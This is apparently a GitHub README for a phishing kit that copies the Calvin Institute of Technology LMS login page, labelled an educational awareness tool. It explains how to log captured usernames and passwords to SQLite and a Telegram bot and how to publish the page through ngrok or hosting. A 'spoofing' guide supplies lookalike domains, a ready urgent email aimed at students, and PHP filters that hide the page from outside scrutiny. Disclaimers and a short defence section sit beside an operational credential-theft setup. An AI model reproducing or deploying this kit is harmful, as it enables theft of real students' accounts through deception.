# LMS Moodle Calvin Phishing Page - Educational Security Tool By Krisopras Eben Haezer

# POC
<img width="1919" height="974" alt="image" src="https://github.com/user-attachments/assets/6392ce19-bb78-484d-8fea-c0515da4548c" />

# POC 2
<img width="938" height="923" alt="image" src="https://github.com/user-attachments/assets/0401c057-645a-4d03-809a-887cc04401ab" />


## ⚠️ EDUCATIONAL PURPOSE ONLY

This tool is designed **exclusively for educational purposes** and security awareness training. Unauthorized use of this tool for malicious activities is **strictly prohibited** and may violate applicable laws.

**Legitimate Use Cases:**
- Security awareness training
- Phishing simulation for employee education
- Academic research and cybersecurity studies
- Testing your own organization's security awareness
- Demonstrating phishing techniques in controlled environments

**⚠️ WARNING:**
- Do NOT use for actual phishing attacks
- Do NOT deploy without explicit permission
- Do NOT use to steal credentials or personal data
- Users are **fully responsible** for any misuse
- Check local laws before deployment

---

## 🎯 Project Overview

This is a **replica of the LMS Calvin Institute of Technology login page** designed for security education and phishing awareness training. The tool demonstrates how attackers create convincing phishing pages while providing a safe environment for learning.

### Features

- ✅ **Pixel-perfect UI replica** of LMS Calvin login page
- ✅ **SQLite database** for credential logging
- ✅ **Telegram bot notifications** for real-time alerts
- ✅ **Fake error messages** for realistic user experience
- ✅ **Real IP detection** for accurate logging
- ✅ **Mobile-responsive design**
- ✅ **Session management** for error display

---

## 🛠️ Setup Instructions

### Prerequisites

- PHP 8.0 or higher
- Web server (Apache/NginX) or PHP built-in server
- SQLite3 extension enabled
- Telegram Bot Token and Chat ID
- Internet connection for IP detection

### Quick Start

1. **Clone/Download this repository**
   ```bash
   git clone https://github.com/ebenhaezer19/PhissTrain.git
   cd calvin-login-page
   ```

2. **Configure Telegram Bot**
   - Create bot via [@BotFather](https://t.me/botfather) on Telegram
   - Get your **BOT_TOKEN** and **CHAT_ID**
   - Update in `login.php` (lines 29-30):
   ```php
   $BOT_TOKEN = 'YOUR_BOT_TOKEN';
   $CHAT_ID = 'YOUR_CHAT_ID';
   ```

3. **Start PHP Server**
   ```bash
   php -S localhost:8000
   ```

4. **Test the Setup**
   - Access: `http://localhost:8000/login.php`
   - Enter test credentials
   - Check Telegram for notifications
   - View database: `http://localhost:8000/view_credentials.php`

---

## 🌐 Making Public (Advanced)

### Option 1: Ngrok (Recommended for Testing)

1. **Install Ngrok**
   ```bash
   # Download from https://ngrok.com/download
   # Or use chocolatey: choco install ngrok
   ```

2. **Start Ngrok**
   ```bash
   ngrok http 8000
   ```

3. **Get Public URL**
   - Ngrok will give you: `https://random-words.ngrok.io`
   - Use this URL for your phishing simulation

### Option 2: LocalTunnel

```bash
# Install
npm install -g localtunnel

# Run
lt --port 8000
```

### Option 3: Web Hosting

1. **Upload files to web host**
2. **Ensure PHP and SQLite are supported**
3. **Update file permissions**
4. **Test all functionality**

---

## 🎭 Spoofing & Realism Guide

### Making It Convincing

#### 1. **URL Masking**
```html
<!-- Use URL shorteners or custom domains -->
https://lms-calvin-login.pages.dev
https://calvin-lms.web.app
https://lms.calvin.ac.id.login-verify.com
```

#### 2. **Email Templates**
```
Subject: 🔴 URGENT: Account Verification Required

Dear Student,

Your LMS Calvin account requires immediate verification due to:
- Security system update
- Suspicious login activity
- Account maintenance

Please verify your account within 24 hours:
https://lms-calvin-login.pages.dev

Failure to verify may result in account suspension.

IT Support Team
Calvin Institute of Technology
```

#### 3. **Social Engineering Tactics**

**Legitimate Scenarios:**
- System maintenance notifications
- Security update requirements
- Account verification requests
- Password reset notifications
- COVID-19 related updates
- Grade posting notifications

**Key Elements:**
- **Urgency**: "24 hours", "immediate action required"
- **Authority**: "IT Department", "System Administrator"
- **Consequences**: "account suspension", "data loss"
- **Familiar branding**: Use official logos and colors

#### 4. **Landing Page Optimization**

```php
// Add these to login.php for more realism:

// 1. Referer check
if (!isset($_SERVER['HTTP_REFERER']) || 
    !strpos($_SERVER['HTTP_REFERER'], 'calvin.ac.id')) {
    // Redirect or show error for direct access
}

// 2. Time-based restrictions
$allowed_hours = [8, 9, 10, 11, 13, 14, 15, 16, 17];
if (!in_array(date('H'), $allowed_hours)) {
    // Show "maintenance" page
}

// 3. Geolocation filtering
$user_ip = $_SERVER['REMOTE_ADDR'];
$geo = json_decode(file_get_contents("http://ip-api.com/json/$user_ip"));
if ($geo->country !== 'ID') {
    // Block or redirect foreign IPs
}
```

---

## 📊 Monitoring & Analytics

### Database Access
```bash
# View captured credentials
http://your-domain.com/view_credentials.php

# Export to CSV (add this to view_credentials.php)
SELECT username, password, ip_address, timestamp 
FROM credentials 
ORDER BY created_at DESC;
```

### Telegram Notifications
Real-time alerts include:
- 👤 Username/Email
- 🔑 Password
- 🌐 IP Address (real external IP)
- 🖥️ User Agent
- 📅 Timestamp
- 🔗 Referer
- 📍 URL

### Success Metrics
- **Click-through rate**: Email opens → link clicks
- **Credential submission rate**: Page visits → form submissions
- **Time on page**: How long users stay
- **IP geolocation**: Geographic distribution

---

## 🔒 Security Considerations

### For Administrators

1. **Secure your setup:**
   - Use HTTPS (SSL certificates)
   - Protect admin pages with authentication
   - Regular database backups
   - Monitor access logs

2. **Legal compliance:**
   - Obtain written permission
   - Include educational disclaimers
   - Follow data protection laws
   - Provide debriefing after training

3. **Data protection:**
   - Encrypt stored credentials
   - Regular data cleanup
   - Secure database access
   - Audit trail maintenance

### For Users

**Red Flags to Teach:**
- ❌ URL mismatches (lms.calvin.ac.id vs lms-calvin-login.pages.dev)
- ❌ Grammar/spelling errors
- ❌ Urgency/threat tactics
- ❌ Unexpected email requests
- ❌ Generic greetings

**Safe Practices:**
- ✅ Verify URLs before clicking
- ✅ Use bookmarks for important sites
- ✅ Enable two-factor authentication
- ✅ Report suspicious emails
- ✅ Contact IT directly for verification

---

## 🛡️ Defense & Prevention

### Technical Controls

1. **Email Security**
   - SPF/DKIM/DMARC records
   - Advanced email filtering
   - URL scanning and sandboxing
   - Attachment analysis

2. **Web Protection**
   - Browser security warnings
   - Certificate transparency
   - Anti-phishing toolbars
   - DNS-based filtering

3. **User Training**
   - Regular phishing simulations
   - Security awareness programs
   - Reporting procedures
   - Incident response drills

### Organizational Policies

1. **Acceptable Use Policies**
2. **Incident Response Plans**
3. **Security Training Programs**
4. **Reporting Mechanisms**

---

## 📚 Educational Resources

### Recommended Reading
- [Phishing.org](https://www.phishing.org/) - Latest phishing trends
- [Anti-Phishing Working Group](https://apwg.org/) - Industry reports
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) - Security guidelines
- [SANS Security Awareness](https://www.sans.org/security-awareness-training/) - Training materials

### Training Modules
1. **Email Security** - Identifying malicious emails
2. **Web Safety** - Browser security best practices
3. **Social Engineering** - Psychological manipulation tactics
4. **Incident Response** - What to do when compromised

---

## 🚨 Emergency Procedures

### If Compromised
1. **Immediately**: Change all passwords
2. **Report**: Notify IT/security team
3. **Monitor**: Watch for suspicious activity
4. **Investigate**: Check logs and access patterns
5. **Educate**: Learn from the incident

### Reporting Channels
- IT Security: security@organization.com
- Help Desk: helpdesk@organization.com
- Emergency: +1-xxx-xxx-xxxx

---

## 📈 Metrics & KPIs

### Training Effectiveness
- **Phishing-prone percentage**: Users who click
- **Reporting rate**: Users who report suspicious emails
- **Training completion**: Security awareness participation
- **Improvement over time**: Progress tracking

### Dashboard Metrics
```php
// Add to admin dashboard
$total_attempts = "SELECT COUNT(*) FROM credentials";
$unique_users = "SELECT COUNT(DISTINCT username) FROM credentials";
$success_rate = ($total_attempts / $total_emails) * 100;
$reporting_rate = ($reports / $attempts) * 100;
```

---

## 🔄 Maintenance

### Regular Tasks
- [ ] Update Telegram bot tokens
- [ ] Clean old database entries
- [ ] Review security logs
- [ ] Update phishing scenarios
- [ ] Backup captured data
- [ ] Renew SSL certificates

### Updates & Improvements
- Add new phishing scenarios
- Update UI to match latest LMS changes
- Enhance security features
- Improve analytics and reporting

---

## 📞 Support & Contact

### Technical Support
- **GitHub Issues**: Report bugs and feature requests
- **Documentation**: Check this README first
- **Community**: Join security awareness forums

BlackLine Channel Telegram (@BlackLineGroup)
<img width="379" height="920" alt="image" src="https://github.com/user-attachments/assets/ee72f75c-5dc0-4533-ad38-68288372df27" />


### Legal & Ethical Questions
- **Compliance Officer**: krisoprasebenhaezer@gmail.com
- **Ethics Committee**: ethics@organization.com
- **Security Team**: security@organization.com

---

## 📄 License & Disclaimer

**MIT License** - This project is for educational purposes only.

**The authors and contributors are not responsible for any misuse** of this tool. Users must comply with all applicable laws and regulations. Use only with explicit permission and for legitimate educational purposes.

---

**Remember**: The goal is to **educate and protect**, not to deceive or harm. Use responsibly! 🛡️📚

---

*Last updated: November 2025*
*Version: 1.0.0*
